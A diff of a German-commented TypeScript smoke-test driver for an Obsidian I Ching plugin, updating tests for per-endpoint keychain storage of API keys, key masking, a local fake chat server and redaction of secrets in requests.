@@ -70,8 +70,11 @@ const PANEL_VIEW = "yijing-oracle-panel";
 const DATA_PATH = `.obsidian/plugins/${PLUGIN_ID}/data.json`;
 /** Sicherungskopie fuer den Fall, dass der Lauf hart abbricht (Ctrl-C, Absturz). */
 const DATA_RESCUE = `.obsidian/plugins/${PLUGIN_ID}/data.json.smoke-rescue`;
-/** src/core/settings/api-key-storage.ts: API_KEY_SECRET_ID — der feste Schluesselbund-Eintrag. */
-const API_KEY_SECRET_ID = "yijing-oracle-llm-api-key";
+/** Schluesselbund-Eintraege dieses Plugins: je Endpunkt-Zeile einer unter diesem Praefix (Kit
+ *  `endpointSecretPrefix`, `<pluginId>-ep-<id>`), dazu der alte Einzel-Eintrag bis 0.10
+ *  (`LEGACY_API_KEY_SECRET_ID` in src/core/settings/migrate.ts — wird gelesen, nie geloescht). */
+const EP_SECRET_PREFIX = `${PLUGIN_ID}-ep-`;
+const LEGACY_SECRET_ID = "yijing-oracle-llm-api-key";
 
 /** Bestands-`data.json` in der Form von 0.3.0: kennt weder `backend` noch `comfyWorkflow`
  *  noch `comfyStepsOverride`. Genau das ist Schritt 2 der Handover-Checkliste — die Frage
@@ -158,22 +161,31 @@ async function removeVaultFile(cdp: Cdp, path: string): Promise<void> {
   `);
 }
 
-/** Schluesselbund-Zustand: `null` als Ganzes, wenn Obsidian keinen hat (< 1.11.4). */
-async function schluesselbund(cdp: Cdp): Promise<{ wert: string | null } | null> {
-  return cdp.evaluate<{ wert: string | null } | null>(`
-    if (!app.secretStorage) return null;
-    return { wert: app.secretStorage.getSecret(${JSON.stringify(API_KEY_SECRET_ID)}) };
+/** Alle Schluesselbund-Eintraege des Plugins (Zeilen-Praefix und alter Einzel-Eintrag) als
+ *  Id → Wert; `null` als Ganzes, wenn Obsidian keinen Schluesselbund hat (< 1.11.4). */
+type Bund = Record<string, string>;
+async function schluesselbund(cdp: Cdp): Promise<Bund | null> {
+  return cdp.evaluate<Bund | null>(`
+    const s = app.secretStorage; if (!s) return null;
+    const ids = (typeof s.listSecrets === "function" ? s.listSecrets() : []).filter((i) => i.startsWith(${JSON.stringify(EP_SECRET_PREFIX)}));
+    ids.push(${JSON.stringify(LEGACY_SECRET_ID)});
+    const out = {};
+    for (const id of ids) { const v = s.getSecret(id); if (v) out[id] = v; }
+    return out;
   `);
 }
 
-/** Eintrag zuruecksetzen: loeschen, wenn er vorher fehlte (deleteSecret gibt es zur Laufzeit,
- *  nicht in der .d.ts — s. _docs/LESSONS.md 2026-08-30), sonst den Vorwert schreiben. */
-async function schluesselbundZuruecksetzen(cdp: Cdp, vorher: string | null): Promise<void> {
+/** Zustand von vorher wiederherstellen: was dazugekommen ist, wird entfernt (deleteSecret gibt es
+ *  zur Laufzeit, nicht in der .d.ts — s. _docs/LESSONS.md 2026-08-30; sonst Leerstring), was
+ *  fehlt oder anders ist, wird zurueckgeschrieben. */
+async function schluesselbundZuruecksetzen(cdp: Cdp, vorher: Bund): Promise<void> {
   await cdp.evaluate(`
     const s = app.secretStorage; if (!s) return false;
-    const id = ${JSON.stringify(API_KEY_SECRET_ID)};
-    if (${JSON.stringify(vorher)} === null && typeof s.deleteSecret === "function") s.deleteSecret(id);
-    else s.setSecret(id, ${JSON.stringify(vorher ?? "")});
+    const vorher = ${JSON.stringify(vorher)};
+    const jetzt = (typeof s.listSecrets === "function" ? s.listSecrets() : []).filter((i) => i.startsWith(${JSON.stringify(EP_SECRET_PREFIX)}));
+    jetzt.push(${JSON.stringify(LEGACY_SECRET_ID)});
+    for (const id of jetzt) if (!(id in vorher) && s.getSecret(id)) { if (typeof s.deleteSecret === "function") s.deleteSecret(id); else s.setSecret(id, ""); }
+    for (const [id, wert] of Object.entries(vorher)) if (s.getSecret(id) !== wert) s.setSecret(id, wert);
     return true;
   `);
 }
@@ -214,10 +226,11 @@ async function openSettingsTab(cdp: Cdp, port: number): Promise<SettingsUi | nul
     return true;
   `);
 
-  // Erkennung ODER statt UND: `.yijing-ep-status` markiert den LOKALEN Endpunkt-Editor, der
-  // bei installiertem LLM Endpoint Manager durch buildEndpointSourceSection ersetzt wird und
-  // dann fehlt (Abschnitt M) — der Plugin-Name im Tab-Text ist in beiden Faellen da.
-  const marker = `Boolean(root.querySelector(".yijing-ep-status")) || Boolean(root.textContent && root.textContent.includes(${JSON.stringify(PLUGIN_NAME)}))`;
+  // Erkennung ODER statt UND: `.okit-ep-status` markiert die LOKALE Endpunkt-Liste, `.okit-collapsible-header`
+  // den Abschnitt „Anfrage“, den die Verbindung in jedem Fall zeichnet — auch mit LLM Endpoint Manager,
+  // wo die lokale Liste fehlt (Abschnitt M). Der Plugin-Name im Tab-Text taugt nur als dritter Anker:
+  // ab 1.14 steht er im Inhaltsbereich nicht mehr (gemessen 2026-10-09; M1–M3 liefen daran ins Leere).
+  const marker = `Boolean(root.querySelector(".okit-ep-status, .okit-collapsible-header")) || Boolean(root.textContent && root.textContent.includes(${JSON.stringify(PLUGIN_NAME)}))`;
 
   // Fall 1 (bis 1.12): Modal im selben Fenster.
   const alsModal = await cdp.evaluate<boolean>(
@@ -256,7 +269,10 @@ async function closeSettings(cdp: Cdp, ui: SettingsUi | null): Promise<void> {
  *  ist das `document`, beim Modal dessen Container — damit dieselben Selektoren in
  *  beiden Faellen dasselbe treffen. */
 function wurzelAusdruck(ui: SettingsUi): string {
-  return ui.praefix ? `document.querySelector(".modal.mod-settings")` : `document`;
+  // `document.body`, nicht `document`: `Document.textContent` ist immer null. M1 las damit seit jeher den
+  // Leerstring und war rot, ohne je den Tab gemessen zu haben (gemessen 2026-10-09, Welle 15; die
+  // „vorbestehende“ Baseline-Rotung war dieser Treiberfehler, kein Plugin-Befund).
+  return ui.praefix ? `document.querySelector(".modal.mod-settings")` : `document.body`;
 }
 
 async function bildSektion(ui: SettingsUi): Promise<{
@@ -430,38 +446,45 @@ async function abschnittMigration(cdp: Cdp): Promise<void> {
     `comfyWorkflow=${JSON.stringify(img.comfyWorkflow)} comfyStepsOverride=${JSON.stringify(img.comfyStepsOverride)}`,
   );
 
-  const eps = Array.isArray(llm.endpoints) ? (llm.endpoints as string[]) : [];
+  // Seit der Verbindung ist die Liste eine EndpointConfig[] (umgeschrieben: bis 0.10 ein string[]).
+  const eps = Array.isArray(llm.endpoints) ? (llm.endpoints as Array<{ url?: string; apiKey?: string; secretId?: string }>) : [];
   record(
-    "B5 LLM-Endpunktliste unveraendert",
-    eps.length === 2 && eps[0] === BESTAND_030.llm.endpoints[0] && eps[1] === BESTAND_030.llm.endpoints[1],
-    `endpoints=${JSON.stringify(eps)}`,
+    "B5 LLM-Endpunktliste unveraendert (jetzt zwei Zeilen mit URL)",
+    eps.length === 2 && eps[0]?.url === BESTAND_030.llm.endpoints[0] && eps[1]?.url === BESTAND_030.llm.endpoints[1],
+    `endpoints=${JSON.stringify(eps.map((e) => e.url))}`,
   );
+  const bund = await schluesselbund(cdp);
   // Der Fund aus dem Kit-0.23.0-Seed: ein globaler Schluessel, den eine Migration still
-  // fallen laesst, ergibt "Endpunkt nie erreichbar" ohne jede Meldung.
+  // fallen laesst, ergibt "Endpunkt nie erreichbar" ohne jede Meldung. Seit der Verbindung
+  // traegt JEDE Zeile den Schluessel (je Zeile ein Schluesselbund-Eintrag), nicht mehr ein
+  // globales Feld; bei einem Schluesselbund steht der Wert dort, sonst in der Zeile.
+  const wertVonZeile = (e: { apiKey?: string; secretId?: string }): string | undefined =>
+    bund ? (e.secretId ? bund[e.secretId] : undefined) : e.apiKey;
   record(
-    "B6 API-Schluessel ueberlebt die Migration",
-    llm.apiKey === BESTAND_030.llm.apiKey,
-    `apiKey=${JSON.stringify(llm.apiKey)}`,
+    "B6 API-Schluessel ueberlebt die Migration (je Zeile, im Schluesselbund unter yijing-oracle-ep-<id>)",
+    eps.length === 2 && eps.every((e) => wertVonZeile(e) === BESTAND_030.llm.apiKey)
+      && (!bund || eps.every((e) => (e.secretId ?? "").startsWith(EP_SECRET_PREFIX))),
+    `${bund ? "Schluesselbund" : "kein Schluesselbund (< 1.11.4), Zeile"}: ${JSON.stringify(eps.map((e) => ({ secretId: e.secretId ?? null, wert: wertVonZeile(e) ?? null })))}`,
   );
-  // Gegenstueck zu stripLegacyLlmFields: die Leiche darf NICHT zurueckkommen.
+  // Gegenstueck zur Migration: die Leiche darf NICHT zurueckkommen.
   record(
     "B7 keine Alt-Leiche activeEndpoint",
     !("activeEndpoint" in llm),
     "activeEndpoint" in llm ? "Feld ist wieder da" : "Feld fehlt wie erwartet",
   );
-  // Seit 2026-09-03 wandert der Schluessel beim Laden in Obsidians Schluesselbund und
-  // data.json wird bereinigt — B6 misst nur den Speicher, das hier misst die PLATTE. Zwei
-  // richtige Ausgaenge (Muster obsidian-paperize 2026-09-02): mit Schluesselbund liegt der
-  // Wert dort und data.json ist leer; ohne (< 1.11.4) bleibt er in data.json wie bis 0.5.1.
-  const platte = JSON.parse((await readVaultFile(cdp, DATA_PATH)) ?? "{}") as { llm?: { apiKey?: string } };
-  const aufPlatte = platte.llm?.apiKey ?? "(fehlt)";
-  const bund = await schluesselbund(cdp);
+  // B6 misst den Speicher, das hier misst die PLATTE (umgeschrieben: vorher `llm.apiKey` in
+  // data.json). Mit Schluesselbund traegt data.json weder `llm.apiKey` noch ein `apiKey` an einer
+  // Zeile; ohne (< 1.11.4) bleibt der Wert in der Zeile.
+  const platte = JSON.parse((await readVaultFile(cdp, DATA_PATH)) ?? "{}") as { llm?: { apiKey?: string; endpoints?: Array<{ apiKey?: string }> } };
+  const zeilenMitKlartext = (platte.llm?.endpoints ?? []).filter((e) => typeof e.apiKey === "string" && e.apiKey !== "").length;
   record(
-    "B8 Altwert wandert beim Laden in den Schluesselbund, data.json wird bereinigt",
-    bund ? aufPlatte === "" && bund.wert === BESTAND_030.llm.apiKey : aufPlatte === BESTAND_030.llm.apiKey,
+    "B8 Altwert verlaesst data.json: wandert beim Laden in den Schluesselbund",
     bund
-      ? `data.json apiKey=${JSON.stringify(aufPlatte)} · Schluesselbund=${JSON.stringify(bund.wert)}`
-      : `kein Schluesselbund (< 1.11.4) — data.json apiKey=${JSON.stringify(aufPlatte)}`,
+      ? platte.llm?.apiKey === undefined && zeilenMitKlartext === 0
+      : platte.llm?.apiKey === undefined && zeilenMitKlartext === eps.length,
+    bund
+      ? `data.json: llm.apiKey ${platte.llm?.apiKey === undefined ? "fehlt" : "ist noch da"}, ${zeilenMitKlartext} Zeile(n) mit Klartext-Schluessel · Schluesselbund: ${Object.keys(bund).filter((i) => i.startsWith(EP_SECRET_PREFIX)).length} Zeilen-Eintrag/-Eintraege, alter Einzel-Eintrag ${LEGACY_SECRET_ID in bund ? "unangetastet" : "(war nicht gesetzt)"}`
+      : `kein Schluesselbund (< 1.11.4) — ${zeilenMitKlartext} Zeile(n) mit Klartext-Schluessel`,
   );
 }
 
@@ -710,49 +733,67 @@ async function abschnittDeklarativ(cdp: Cdp, port: number): Promise<void> {
   );
 
   await sucheInEinstellungen(ui, "");
+  // Umgeschrieben: bis 0.10 ein globales Schluesselfeld; jetzt traegt jede Endpunkt-Zeile des Kit-
+  // Bausteins ihren Schluessel im Schluesselbund und zeigt „gespeichert“ mit Stift („aendern“)
+  // statt eines Feldes. Das Feld erscheint erst nach dem Klick auf den Stift — F7 misst es dort.
+  const stiftGeklickt = await ui.cdp.evaluate<boolean>(`
+    const wurzel = document.querySelector(".vertical-tab-content-container") || document;
+    const zeile = wurzel.querySelector(".okit-ep-row");
+    const stift = zeile?.querySelector(".extra-setting-button svg.lucide-pencil")?.closest(".extra-setting-button")
+      ?? zeile?.querySelector(".extra-setting-button");
+    if (!stift) return false;
+    stift.click();
+    return true;
+  `);
+  await schlaf(400);
   const maskiert = await ui.cdp.evaluate<{ felder: number; typen: string[] }>(`
     const wurzel = document.querySelector(".vertical-tab-content-container") || document;
-    const felder = [...wurzel.querySelectorAll("input")].filter((i) => i.type === "password");
+    const zeile = wurzel.querySelector(".okit-ep-row");
+    const felder = [...(zeile ?? wurzel).querySelectorAll("input")].filter((i) => i.type === "password");
     return { felder: felder.length, typen: felder.map((f) => f.type) };
   `);
   record(
-    "F7 API-Schluessel-Feld ist maskiert",
-    maskiert.felder === 1,
-    `${maskiert.felder} Feld(er) mit type=password im Plugin-Tab`,
+    "F7 API-Schluessel-Feld der Endpunkt-Zeile ist maskiert (nach „aendern“)",
+    stiftGeklickt && maskiert.felder === 1,
+    stiftGeklickt ? `${maskiert.felder} Feld(er) mit type=password in der ersten Endpunkt-Zeile` : "kein „aendern“-Knopf an der Endpunkt-Zeile gefunden",
   );
 
   // F8 misst den SPEICHERpfad ueber das echte Feld (B8 den Ladepfad): eine Eingabe muss im
-  // Schluesselbund ankommen und data.json leer lassen. Bewusst ueber die Komponente statt
-  // ueber `plugin.settings` — ein Punkt, der den Zustand direkt schreibt, haette den Weg,
-  // auf dem ein Defekt saesse, nie betreten (REGISTRY: „Pruefpunkt, der den Defektpfad
-  // umgeht"). Der native Setter + `input`-Event: Obsidians TextComponent hoert auf `input`,
-  // eine blosse Zuweisung an `value` feuert nichts. Getippt wird im Einstellungen-Fenster
-  // (eigener JS-Kontext, kennt kein `app`), gemessen im Hauptfenster.
+  // Schluesselbund ankommen (unter dem Eintrag der Zeile) und data.json ohne Klartext lassen.
+  // Bewusst ueber die Komponente statt ueber `plugin.settings` — ein Punkt, der den Zustand direkt
+  // schreibt, haette den Weg, auf dem ein Defekt saesse, nie betreten (REGISTRY: „Pruefpunkt, der
+  // den Defektpfad umgeht“). Der native Setter + `input`-Event, dann `blur` (der Kit-Baustein
+  // schreibt bei blur, nicht pro Tastendruck): eine blosse Zuweisung an `value` feuert nichts.
+  // Getippt wird im Einstellungen-Fenster (eigener JS-Kontext, kennt kein `app`), gemessen im
+  // Hauptfenster.
   const F8_WERT = "smoke-f8-schluessel";
+  const zeilenId = await cdp.evaluate<string | null>(`return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.llm.endpoints[0]?.secretId ?? null;`);
   const getippt = await ui.cdp.evaluate<boolean>(`
     const wurzel = document.querySelector(".vertical-tab-content-container") || document;
-    const feld = [...wurzel.querySelectorAll("input")].find((i) => i.type === "password");
+    const feld = [...(wurzel.querySelector(".okit-ep-row") ?? wurzel).querySelectorAll("input")].find((i) => i.type === "password");
     if (!feld) return false;
     Object.getOwnPropertyDescriptor(Object.getPrototypeOf(feld), "value").set.call(feld, ${JSON.stringify(F8_WERT)});
     feld.dispatchEvent(new Event("input", { bubbles: true }));
+    feld.dispatchEvent(new Event("blur"));
     return true;
   `);
-  let f8 = { bund: null as { wert: string | null } | null, platte: "(nicht gelesen)" };
-  for (let i = 0; i < 10 && getippt; i++) {
+  let f8 = { bund: null as Bund | null, wert: null as string | null };
+  for (let i = 0; i < 12 && getippt; i++) {
     await schlaf(300);
     f8.bund = await schluesselbund(cdp);
-    if (f8.bund?.wert === F8_WERT || f8.bund === null) break;
+    f8.wert = zeilenId && f8.bund ? (f8.bund[zeilenId] ?? null) : null;
+    if (f8.wert === F8_WERT || f8.bund === null) break;
   }
-  const f8Platte = JSON.parse((await readVaultFile(cdp, DATA_PATH)) ?? "{}") as { llm?: { apiKey?: string } };
-  f8.platte = f8Platte.llm?.apiKey ?? "(fehlt)";
+  const f8Platte = JSON.parse((await readVaultFile(cdp, DATA_PATH)) ?? "{}") as { llm?: { endpoints?: Array<{ apiKey?: string }> } };
+  const f8Klartext = (f8Platte.llm?.endpoints ?? []).some((e) => e.apiKey === F8_WERT);
   record(
-    "F8 Eingabe im Feld landet im Schluesselbund, nicht in data.json",
-    getippt && (f8.bund ? f8.bund.wert === F8_WERT && f8.platte === "" : f8.platte === F8_WERT),
+    "F8 Eingabe im Feld landet im Schluesselbund (Eintrag der Zeile), nicht in data.json",
+    getippt && (f8.bund ? f8.wert === F8_WERT && !f8Klartext : f8Klartext),
     !getippt
       ? "kein Passwortfeld gefunden"
       : f8.bund
-        ? `Schluesselbund=${JSON.stringify(f8.bund.wert)} · data.json apiKey=${JSON.stringify(f8.platte)}`
-        : `kein Schluesselbund (< 1.11.4) — data.json apiKey=${JSON.stringify(f8.platte)}`,
+        ? `Eintrag ${String(zeilenId)}=${JSON.stringify(f8.wert)} · Klartext in data.json: ${f8Klartext ? "ja" : "nein"}`
+        : `kein Schluesselbund (< 1.11.4) — Klartext in data.json: ${f8Klartext ? "ja" : "nein"}`,
   );
 
   await closeSettings(cdp, ui);
@@ -795,7 +836,7 @@ async function abschnittBild(cdp: Cdp, endpoint: string, workflowFixture: string
     p.settings.image.comfyWorkflow = ${JSON.stringify(workflowFixture)};
     p.settings.image.size = 512;
     p.settings.image.comfyStepsOverride = 8;
-    await p.saveSettings();
+    p.llm.invalidate(); await p.saveSettings();
     return true;
   `);
   // Das Panel liest die Einstellungen beim Zeichnen — neu aufbauen statt hoffen.
@@ -906,17 +947,18 @@ const MANAGER_PLUGIN_ID = "llm-endpoint-manager";
 const MANAGER_DEFAULT_MODEL = "smoke-manager-model";
 const LOCAL_FALLBACK_MODEL = "smoke-lokal-modell";
 
-interface FakeChatEndpoint { url: string; close: () => Promise<void>; chatCalls: () => number; lastModel: () => string | null; lastBody: () => Record<string, unknown> | null }
+interface FakeChatEndpoint { url: string; close: () => Promise<void>; chatCalls: () => number; lastModel: () => string | null; lastBody: () => Record<string, unknown> | null; lastAuth: () => string | null }
 
 /** Eigener Mini-HTTP-Server statt eines echten LLM-Servers oder des echten Manager-Plugins —
  *  M1-M3 pruefen die KONSUMENTEN-Seite (resolveLlmEndpoint()/findEndpointManager() in
  *  view.ts), nicht den Manager selbst. Sammelt den Request-Body VOLLSTAENDIG ein, bevor
  *  geantwortet wird (kein Race gegen die eigene Antwort — Fund aus lingotuner 66bd0be). */
-async function startFakeChatEndpoint(modelId: string): Promise<FakeChatEndpoint> {
+async function startFakeChatEndpoint(modelId: string, antwort?: (body: Record<string, unknown>) => string): Promise<FakeChatEndpoint> {
   const { createServer } = await import("node:http");
   let chatCalls = 0;
   let lastModel: string | null = null;
   let lastBody: Record<string, unknown> | null = null;
+  let lastAuth: string | null = null;
   const server = createServer((req, res) => {
     // Der Renderer laeuft unter app://obsidian.md — ohne CORS-Header blockt der Browser den
     // Preflight (OPTIONS) und die eigentliche Anfrage sieht der Server nie.
@@ -934,9 +976,11 @@ async function startFakeChatEndpoint(modelId: string): Promise<FakeChatEndpoint>
       req.on("data", (chunk: Buffer) => { body += chunk.toString("utf8"); });
       req.on("end", () => {
         chatCalls += 1;
+        lastAuth = typeof req.headers.authorization === "string" ? req.headers.authorization : null;
         try { lastBody = JSON.parse(body) as Record<string, unknown>; lastModel = (lastBody.model as string | undefined) ?? null; } catch { lastBody = null; lastModel = null; }
         res.writeHead(200, { "Content-Type": "text/event-stream" });
-        res.write(`data: ${JSON.stringify({ choices: [{ delta: { content: "ok" }, finish_reason: null }], model: modelId })}\n\n`);
+        const inhalt = antwort && lastBody ? antwort(lastBody) : "ok";
+        res.write(`data: ${JSON.stringify({ choices: [{ delta: { content: inhalt }, finish_reason: null }], model: modelId })}\n\n`);
         res.write(`data: ${JSON.stringify({ choices: [{ delta: {}, finish_reason: "stop" }], model: modelId })}\n\n`);
         res.write("data: [DONE]\n\n");
         res.end();
@@ -955,6 +999,7 @@ async function startFakeChatEndpoint(modelId: string): Promise<FakeChatEndpoint>
     chatCalls: () => chatCalls,
     lastModel: () => lastModel,
     lastBody: () => lastBody,
+    lastAuth: () => lastAuth,
   };
 }
 
@@ -1007,12 +1052,15 @@ const MANAGED_TEXT = ["Endpunkte kommen vom LLM Endpoint Manager", "Endpoints co
 /** Ein Wurf + Deutungslauf: braucht das offene Panel, wirft neu (das Ergebnis selbst ist fuer
  *  M irrelevant) und klickt danach den Deuten-Knopf — der ist der einzige Knopf in
  *  `.yijing-interpretation-inner .yijing-actions`, solange keine Deutung vorliegt. */
-async function laufeDeutung(cdp: Cdp, wartenMs = 15000): Promise<boolean> {
+/** Textlaenge der Deutung beim Ende von `laufeDeutung` (vor einem Abbruch gemessen). */
+let letzteDeutungLaenge = 0;
+
+async function laufeDeutung(cdp: Cdp, wartenMs = 15000, frage = "Smoke M: Endpunkt-Manager", genugZeichen = 0): Promise<boolean> {
   const offen = await openPanel(cdp);
   if (!offen) return false;
   await cdp.evaluate(`
     const q = document.querySelector(".yijing-oracle .yijing-question");
-    if (q) { q.value = "Smoke M: Endpunkt-Manager"; q.dispatchEvent(new Event("input")); }
+    if (q) { q.value = ${JSON.stringify(frage)}; q.dispatchEvent(new Event("input")); }
     return true;
   `);
   const geworfen = await clickPanelButton(cdp, ".yijing-oracle .yijing-actions button");
@@ -1020,13 +1068,25 @@ async function laufeDeutung(cdp: Cdp, wartenMs = 15000): Promise<boolean> {
   await schlaf(500);
   const geklickt = await clickPanelButton(cdp, ".yijing-interpretation-inner .yijing-actions button");
   if (!geklickt) return false;
+  // `genugZeichen` > 0: auch ein noch laufender Stream mit so viel Text zaehlt (und wird danach abgebrochen).
+  // Ein echtes Modell kann ohne Token-Grenze minutenlang weiterschreiben — fuer „streamt“ genuegt der Beleg.
   const fertig = await pollUntil<boolean>(
     cdp,
     `const body = document.querySelector(".yijing-interpretation-body");
-     return Boolean(body && body.textContent && body.textContent.trim().length > 0) ? true : null;`,
+     const tail = document.querySelector(".okit-stream-tail");
+     return (Boolean(body && body.textContent && body.textContent.trim().length > 0)
+       || (${genugZeichen} > 0 && Boolean(tail && tail.textContent && tail.textContent.length >= ${genugZeichen}))) ? true : null;`,
     wartenMs,
     300,
   );
+  if (fertig) {
+    // Laenge VOR einem Abbruch merken (danach ist die Deutung weg). Noch im Stream und genug Text? Dann
+    // Abbrechen klicken (der einzige Knopf in .yijing-actions, solange gestreamt wird).
+    letzteDeutungLaenge = await cdp.evaluate<number>(`return Math.max((document.querySelector(".yijing-interpretation-body")?.textContent ?? "").trim().length, (document.querySelector(".okit-stream-tail")?.textContent ?? "").length);`);
+    if (genugZeichen > 0) {
+      await cdp.evaluate(`if (document.querySelector(".okit-stream-tail")) document.querySelector(".yijing-interpretation-inner .yijing-actions button")?.click(); return true;`);
+    }
+  }
   return Boolean(fertig);
 }
 
@@ -1052,14 +1112,19 @@ async function pruefeManager(cdp: Cdp, port: number): Promise<void> {
     console.log(`  Fake-Manager-Endpunkt: ${fake.url}`);
     await installFakeManager(cdp, fake.url);
 
-    // M1 — Settings zeigen den Manager-Baustein (managed-Text), keine .yijing-ep-status-Zeile
+    // M1 — Settings zeigen den Manager-Baustein (managed-Text), keine .okit-ep-status-Zeile
     // (der Marker des lokalen Listen-Editors).
     ui = await openSettingsTab(cdp, port);
     if (!ui) { for (const n of NAMEN) skipped(n, "Settings-Oberflaeche nicht gefunden"); return; }
-    const body = await ui.cdp.evaluate<string>(`return (${wurzelAusdruck(ui)}).textContent || "";`);
+    // Erst warten, bis der Tab gezeichnet ist (das frische Fenster ist beim Anhaengen noch leer), und
+    // dem Kit-Baustein Zeit fuer sein asynchrones Neuzeichnen nach der Aufloesung geben — gemessen wird
+    // der Zustand danach, nicht der erste Anstrich.
+    const body = (await pollUntil<string>(ui.cdp, `const t = (${wurzelAusdruck(ui)}).textContent || ""; return t.length > 200 && ${JSON.stringify(MANAGED_TEXT)}.some((m) => t.includes(m)) ? t : null;`, 6000, 250))
+      ?? await ui.cdp.evaluate<string>(`return (${wurzelAusdruck(ui)}).textContent || "";`);
     const managed = MANAGED_TEXT.some((s) => body.includes(s));
-    const localRows = await zeilenZahlSelector(ui, ".yijing-ep-status");
-    record(NAMEN[0]!, managed && localRows === 0, `managed-Text ${managed ? "da" : "fehlt"}, ${localRows} lokale Endpunkt-Zeilen`);
+    const localRows = await zeilenZahlSelector(ui, ".okit-ep-status");
+    const auszug = managed ? "" : ` · Tab-Text rund um „KI“: ${JSON.stringify(body.slice(Math.max(0, body.search(/KI-Deutung|AI interpretation|LLM/i)), Math.max(0, body.search(/KI-Deutung|AI interpretation|LLM/i)) + 220))} (Laenge ${body.length})`;
+    record(NAMEN[0]!, managed && localRows === 0, `managed-Text ${managed ? "da" : "fehlt"}, ${localRows} lokale Endpunkt-Zeilen${auszug}`);
     await closeSettings(cdp, ui);
     ui = null;
 
@@ -1080,7 +1145,7 @@ async function pruefeManager(cdp: Cdp, port: number): Promise<void> {
     await cdp.evaluate(`
       const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
       p.settings.llm.choice = { ...(p.settings.llm.choice ?? {}), model: ${JSON.stringify(gewaehltesModell)} };
-      await p.saveSettings();
+      p.llm.invalidate(); await p.saveSettings();
       return { ok: true };
     `);
     const okM2b = await laufeDeutung(cdp);
@@ -1092,7 +1157,7 @@ async function pruefeManager(cdp: Cdp, port: number): Promise<void> {
     await cdp.evaluate(`
       const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
       p.settings.llm.choice = {};
-      await p.saveSettings();
+      p.llm.invalidate(); await p.saveSettings();
       return { ok: true };
     `);
 
@@ -1102,9 +1167,10 @@ async function pruefeManager(cdp: Cdp, port: number): Promise<void> {
     await removeFakeManager(cdp);
     ui = await openSettingsTab(cdp, port);
     if (!ui) { skipped(NAMEN[3]!, "Settings-Oberflaeche nach Manager-Entfernung nicht gefunden"); return; }
-    const bodyNach = await ui.cdp.evaluate<string>(`return (${wurzelAusdruck(ui)}).textContent || "";`);
+    const bodyNach = (await pollUntil<string>(ui.cdp, `const t = (${wurzelAusdruck(ui)}).textContent || ""; return t.length > 200 && !${JSON.stringify(MANAGED_TEXT)}.some((m) => t.includes(m)) ? t : null;`, 6000, 250))
+      ?? await ui.cdp.evaluate<string>(`return (${wurzelAusdruck(ui)}).textContent || "";`);
     const managedNach = MANAGED_TEXT.some((s) => bodyNach.includes(s));
-    const localRowsNach = await zeilenZahlSelector(ui, ".yijing-ep-status");
+    const localRowsNach = await zeilenZahlSelector(ui, ".okit-ep-status");
     await closeSettings(cdp, ui);
     ui = null;
     const settingsZurueck = !managedNach && localRowsNach > 0;
@@ -1114,8 +1180,8 @@ async function pruefeManager(cdp: Cdp, port: number): Promise<void> {
     vorherEndpoints = (await cdp.evaluate<{ eps: unknown }>(`return { eps: app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.llm.endpoints };`)).eps;
     await cdp.evaluate(`
       const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
-      p.settings.llm.endpoints = [${JSON.stringify(localFake.url)}];
-      await p.saveSettings();
+      p.settings.llm.endpoints = [{ url: ${JSON.stringify(localFake.url)} }];
+      p.llm.invalidate(); await p.saveSettings();
       return { ok: true };
     `);
     const okLokal = await laufeDeutung(cdp);
@@ -1136,7 +1202,7 @@ async function pruefeManager(cdp: Cdp, port: number): Promise<void> {
       await cdp.evaluate(`
         const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
         p.settings.llm.endpoints = ${JSON.stringify(vorherEndpoints)};
-        await p.saveSettings();
+        p.llm.invalidate(); await p.saveSettings();
         return { ok: true };
       `).catch(() => null);
     }
@@ -1172,9 +1238,9 @@ async function pruefeAnfrage(cdp: Cdp, port: number): Promise<void> {
     vorher = await cdp.evaluate(`const l = ${P}.settings.llm; return { eps: l.endpoints, model: l.model, choice: l.choice ?? null, request: ${P}.settings.request };`);
     await cdp.evaluate(`
       const p = ${P};
-      p.settings.llm.endpoints = [${JSON.stringify(fake.url)}]; p.settings.llm.model = ${JSON.stringify(ANFRAGE_MODELL)}; p.settings.llm.choice = {};
+      p.settings.llm.endpoints = [{ url: ${JSON.stringify(fake.url)} }]; p.settings.llm.model = ${JSON.stringify(ANFRAGE_MODELL)}; p.settings.llm.choice = {};
       p.settings.request = { overrides: {}, thinking: {}, lastOnLevel: {}, levelPickerInChat: false };
-      await p.saveSettings();
+      p.llm.invalidate(); await p.saveSettings();
       return true;`);
 
     // N3 — Lauf mit Modus-Defaults, Body am Fake-Server gemessen.
@@ -1246,7 +1312,89 @@ async function pruefeAnfrage(cdp: Cdp, port: number): Promise<void> {
         p.settings.llm.endpoints = v.eps; p.settings.llm.model = v.model;
         if (v.choice === null) delete p.settings.llm.choice; else p.settings.llm.choice = v.choice;
         p.settings.request = v.request;
-        await p.saveSettings();
+        p.llm.invalidate(); await p.saveSettings();
+        return true;`).catch(() => null);
+    }
+  }
+}
+
+/** V1–V6: die Verbindung nach dem Tausch (Kit 0.51.2) — Schluessel je Zeile, Schwaerzung, Neutralisierung.
+ *  Gegen einen Fake-Endpunkt, der den Request-Body aufzeichnet und das Platzhalter-Token aus der
+ *  Anfrage in seine Antwort spiegelt (eine Bild-URL, ein dataviewjs-Block): so sieht der Treiber, was
+ *  auf den Draht geht UND was der Renderer aus der Antwort macht. Lokaler Pfad ohne Manager. */
+const SCHUTZ_MODELL = "qwen/qwen3.6-35b-a3b";
+const V_GEHEIMNIS = "abcdefghijklmnop12345678";   // >= 16 Zeichen, sonst greift die Bearer-Regel nicht
+const V_SK = "sk-abcdefghijklmnop1234";          // ohne Leerzeichen: steht als URL-Teil in einer Markdown-Bild-Syntax
+const V_ZEILEN_SCHLUESSEL = "smoke-v5-schluessel";
+
+async function pruefeSchutz(cdp: Cdp): Promise<void> {
+  console.log("\nV · Verbindung: Schluessel je Zeile, Schwaerzung, Neutralisierung");
+  const NAMEN = [
+    "V1 Zeile mit Klartext-Schluessel: nach resolve steht kein apiKey mehr in data.json, der Wert im Schluesselbund",
+    "V2 Der Schluessel der Zeile geht als Bearer an den Endpunkt",
+    "V3 Ein Geheimnis in der Frage geht als Platzhalter an den Draht, nicht im Klartext",
+    "V4 Die Deutung zeigt das Original wieder (Schwaerzung ist umkehrbar)",
+    "V5 Eine Antwort mit Bild-URL und Platzhalter erzeugt kein img-Element",
